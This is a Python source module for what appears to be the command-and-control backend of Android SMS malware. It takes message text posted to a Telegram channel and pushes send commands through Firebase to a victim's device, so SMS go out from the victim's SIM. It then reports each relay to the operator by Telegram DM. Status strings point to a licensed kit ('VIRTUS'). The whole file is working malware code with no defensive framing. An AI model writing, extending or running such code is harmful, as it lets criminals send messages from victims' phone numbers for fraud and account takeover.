"""Channel + Firebase intercept → victim SIM outgoing relay."""

from __future__ import annotations

import asyncio
import logging
import time

from sqlalchemy.orm import Session

from app.channel_relay import parse_channel_outgoing, queue_channel_sms
from app.database import Device, MonitorProfile, OutboundSMS
from app.device_ui import get_sim_list
from app.firebase_sync import push_outbound_to_firebase
from app.telegram_notify import send_outbound_stream_dm

logger = logging.getLogger(__name__)


async def _relay_fail_dm(telegram_user_id: int, reason: str) -> None:
    from app.config import get_settings

    settings = get_settings()
    if not settings.telegram_bot_token:
        return
    from telegram import Bot

    bot = Bot(token=settings.telegram_bot_token)
    try:
        await bot.send_message(
            chat_id=telegram_user_id,
            text=f"❌ <b>Channel relay failed</b>\n<pre>{reason}</pre>",
            parse_mode="HTML",
        )
    except Exception as exc:
        logger.error("Relay fail DM error: %s", exc)

VIRTUS_SKIP_MARKERS = (
    "INJECT FORWARDED!",
    "STREAM SUCCESSFUL SEND",
    "Monitoring Started!",
    "License Key Set!",
    "KEY GENERATED",
    "SMS Queued",
    "SMS SENT!",
)


def is_virtus_status_post(text: str) -> bool:
    cleaned = (text or "").strip()
    if not cleaned:
        return True
    upper = cleaned.upper()
    return any(marker.upper() in upper for marker in VIRTUS_SKIP_MARKERS)


def is_relayable_outgoing_text(text: str) -> bool:
    cleaned = (text or "").strip()
    if not cleaned or is_virtus_status_post(cleaned):
        return False
    to_number, message = parse_channel_outgoing(cleaned)
    return bool(to_number and message)


def normalize_channel_id(channel_id: str) -> str:
    return channel_id.strip()


def channel_ids_match(stored: str | None, incoming: str) -> bool:
    if not stored:
        return False
    left = normalize_channel_id(stored)
    right = normalize_channel_id(incoming)
    if left == right:
        return True
    return left.lstrip("-") == right.lstrip("-")


def already_relayed_channel_message(
    db: Session,
    telegram_user_id: int,
    channel_message_id: int | None,
) -> bool:
    if channel_message_id is None:
        return False
    existing = (
        db.query(OutboundSMS)
        .filter(
            OutboundSMS.telegram_user_id == telegram_user_id,
            OutboundSMS.channel_message_id == channel_message_id,
        )
        .first()
    )
    return existing is not None


async def relay_outgoing_text(
    db: Session,
    profile: MonitorProfile,
    device: Device,
    text: str,
    *,
    channel_message_id: int | None = None,
    source: str = "channel",
) -> OutboundSMS | None:
    if not profile.sim_selected:
        return None
    if not profile.channel_id:
        return None
    if not is_relayable_outgoing_text(text):
        return None
    if already_relayed_channel_message(db, profile.telegram_user_id, channel_message_id):
        return None

    started = time.monotonic()
    outbound = queue_channel_sms(
        db,
        profile,
        device,
        text,
        channel_message_id=channel_message_id,
    )
    command_id = await push_outbound_to_firebase(profile, device, outbound)
    if command_id is None:
        outbound.status = "failed"
        db.commit()
        logger.error(
            "Channel relay failed for user %s device %s — no Firebase URL/command path",
            profile.telegram_user_id,
            device.name,
        )
        asyncio.create_task(
            _relay_fail_dm(profile.telegram_user_id, "Firebase push failed — check device Firebase URL")
        )
        return None

    outbound.status = "sent"
    db.commit()

    sims = get_sim_list(device)
    sim_index = profile.selected_sim_index or 0
    sim_slot = sims[sim_index]["slot"] if sims else 1
    relay_ms = max(1, int((time.monotonic() - started) * 1000))
    asyncio.create_task(
        send_outbound_stream_dm(
            profile.telegram_user_id,
            outbound.to_number,
            outbound.message,
            sim_slot=sim_slot,
            source=source,
            relay_ms=relay_ms,
        )
    )
    return outbound


async def relay_outgoing_batch(
    db: Session,
    profiles: list[tuple[MonitorProfile, Device]],
    text: str,
    *,
    channel_message_id: int | None = None,
    source: str = "channel",
) -> int:
    sent = 0
    for profile, device in profiles:
        try:
            result = await relay_outgoing_text(
                db,
                profile,
                device,
                text,
                channel_message_id=channel_message_id,
                source=source,
            )
            if result is not None:
                sent += 1
        except Exception as exc:
            logger.error("Outgoing relay failed for user %s: %s", profile.telegram_user_id, exc)
    return sent
